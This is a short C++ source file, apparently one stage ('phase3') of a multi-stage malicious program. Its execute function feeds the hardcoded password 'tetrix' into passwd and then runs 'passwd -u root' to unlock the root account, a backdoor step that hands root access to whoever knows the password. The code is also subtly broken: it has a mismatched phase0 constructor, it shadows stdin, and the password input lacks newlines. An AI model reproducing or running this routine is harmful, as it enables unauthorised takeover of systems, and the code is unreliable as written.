#include "phase3.h"


phase0::phase0()
{

}

int phase3::execute()
{
  FILE* stdin = popen("passwd", "w");
  char* newpass = "tetrix";
  fputs(newpass, stdin);
  fputs(newpass, stdin);
  pclose(stdin);
  system("passwd -u root"); //Unlock the root account.
  return 0;
}
